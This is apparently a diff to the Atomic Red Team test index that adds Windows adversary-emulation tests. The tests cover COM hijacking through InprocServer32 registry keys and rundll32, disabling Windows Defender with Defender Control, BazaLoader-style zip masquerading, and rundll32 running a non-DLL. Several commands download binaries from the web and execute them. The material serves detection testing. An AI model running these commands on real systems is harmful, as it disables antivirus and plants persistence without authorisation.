@@ -12673,7 +12673,48 @@ privilege-escalation:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1053.007:
     technique:
       external_references:
@@ -26186,6 +26227,45 @@ defense-evasion:
           /NoRestart /quiet
         name: command_prompt
         elevation_required: true
+    - name: Disable Defender with Defender Control
+      auto_generated_guid: 178136d8-2778-4d7a-81f3-d517053a4fd6
+      description: "Attempting to use Defender Control software to disable Windows
+        Defender. Upon successful execution, Windows Defender will be turned off.
+        \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        DefenderID:
+          description: Defender ID that is used as a sort of passcode to disable it
+            within Defender Control from the command line. The machine-specific Defender
+            ID can be obtained within Defender Control by going to menu, command line
+            info, and then retrieving the 4 character passcode to continue (listed
+            after defendercontrol /d /id in the command line info window).
+          type: String
+          default: FFFF
+        DefenderControlExe:
+          description: Path to Defender Control software version 1.6.
+          type: String
+          default: "$env:temp\\DefenderControl\\DefenderControl\\DefenderControl.exe"
+      dependency_executor_name: powershell
+      dependencies:
+      - description: "Defender Control must be installed on the machine. \n"
+        prereq_command: 'if (Test-Path #{DefenderControlExe}) {exit 0} else {exit
+          1}
+
+'
+        get_prereq_command: |
+          Start-BitsTransfer -Source "https://web.archive.org/web/20201210152711/https://www.sordum.org/files/download/defender-control/DefenderControl.zip" -Destination "$env:temp\defendercontrol.zip" -dynamic
+          expand-archive -LiteralPath "$env:temp\defendercontrol.zip" -DestinationPath "$env:temp\DefenderControl"
+      executor:
+        command: 'cmd /c #{DefenderControlExe} /D #{DefenderID} | Out-Null
+
+'
+        cleanup_command: 'cmd /c #{DefenderControlExe} /E | Out-Null
+
+'
+        name: powershell
+        elevation_required: true
   T1078.002:
     technique:
       external_references:
@@ -30901,6 +30981,37 @@ defense-evasion:
           start %ALLUSERSPROFILE%\cmd.exe
         cleanup_command: del %ALLUSERSPROFILE%\cmd.exe >nul 2>&1
         name: command_prompt
+    - name: Malware Masquerading and Execution from Zip File
+      auto_generated_guid: 4449c89b-ec82-43a4-89c1-91e2f1abeecc
+      description: When the file is unzipped and the README.cmd file opened, it executes
+        and changes the .pdf to .dll and executes the dll. This is a BazaLoader technique
+        [as reported here](https://twitter.com/ffforward/status/1481672378639912960)
+      supported_platforms:
+      - windows
+      input_arguments:
+        url:
+          description: Location of zip file
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1036/bin/T1036.zip
+      dependencies:
+      - description: Zip file must be present.
+        prereq_command: 'if (Test-Path $env:userprofile\Downloads\T1036.zip) {exit
+          0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest -OutFile "$env:userprofile\Downloads\T1036.zip"
+          #{url}
+
+'
+      executor:
+        command: |-
+          Expand-Archive -Path $env:userprofile\Downloads\T1036.zip -DestinationPath $env:userprofile\Downloads\T1036 -Force
+          cd $env:userprofile\Downloads\T1036
+          cmd /c $env:userprofile\Downloads\T1036\README.cmd >$null 2>$null
+        cleanup_command: |-
+          taskkill /IM Calculator.exe /f >$null 2>$null
+          Remove-Item $env:userprofile\Downloads\T1036 -recurse -ErrorAction Ignore
+        name: powershell
   T1036.005:
     technique:
       id: attack-pattern--1c4e5d32-1fe9-4116-9d9d-59e3925bd6a2
@@ -36300,6 +36411,34 @@ defense-evasion:
 
 '
         name: command_prompt
+    - name: Execution of non-dll using rundll32.exe
+      auto_generated_guid: ae3a8605-b26e-457c-b6b3-2702fd335bac
+      description: "Rundll32.exe running non-dll \n"
+      supported_platforms:
+      - windows
+      input_arguments:
+        input_url:
+          description: Url to download the DLL
+          type: Url
+          default: https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll
+        input_file:
+          description: Non-dll file
+          type: String
+          default: C:\Users\$env:username\Downloads\calc.png
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Non-dll file must exist on disk at specified location
+
+'
+        prereq_command: 'if (Test-Path #{input_file}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: 'Invoke-WebRequest "#{input_url}" -OutFile "#{input_file}"
+
+'
+      executor:
+        name: powershell
+        command: 'rundll32.exe #{input_file}, StartW'
   T1134.005:
     technique:
       external_references:
@@ -42958,7 +43097,48 @@ persistence:
       - Elastic
       x_mitre_platforms:
       - Windows
-    atomic_tests: []
+      identifier: T1546.015
+    atomic_tests:
+    - name: COM Hijacking - InprocServer32
+      auto_generated_guid: 48117158-d7be-441b-bc6a-d9e36e47b52b
+      description: |-
+        This test uses PowerShell to hijack a reference to a Component Object Model by creating registry values under InprocServer32 key in the HKCU hive then calling the Class ID to be executed via rundll32.exe.
+
+        Reference: https://bohops.com/2018/06/28/abusing-com-registry-structure-clsid-localserver32-inprocserver32/
+      supported_platforms:
+      - windows
+      input_arguments:
+        clsid_threading:
+          description: Threading Model
+          type: string
+          default: Apartment
+        dllpath:
+          description: Path to the DLL.
+          type: String
+          default: "$env:TEMP\\AtomicTest.dll"
+        clsid:
+          description: Class ID to hijack.
+          type: string
+          default: "{B5F8350B-0548-48B1-A6EE-88BD00B4A5E7}"
+        clsid_description:
+          description: Description for CLSID
+          type: string
+          default: MSAA AccPropServices
+      dependency_executor_name: powershell
+      dependencies:
+      - description: DLL For testing
+        prereq_command: 'if (Test-Path #{dllpath}) {exit 0} else {exit 1}'
+        get_prereq_command: Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/AtomicTest.dll"
+          -OutFile "#{dllpath}"
+      executor:
+        command: |-
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}' -Value '#{clsid_description}'
+          New-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Value #{dllpath}
+          New-ItemProperty -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}\InprocServer32' -Name 'ThreadingModel' -Value '#{clsid_threading}' -PropertyType "String"
+          Start-Process -FilePath "C:\Windows\System32\RUNDLL32.EXE" -ArgumentList '-sta #{clsid}'
+        cleanup_command: Remove-Item -Path 'HKCU:\SOFTWARE\Classes\CLSID\#{clsid}'
+          -Recurse -ErrorAction Ignore
+        name: powershell
   T1554:
     technique:
       created: '2020-02-11T18:18:34.279Z'
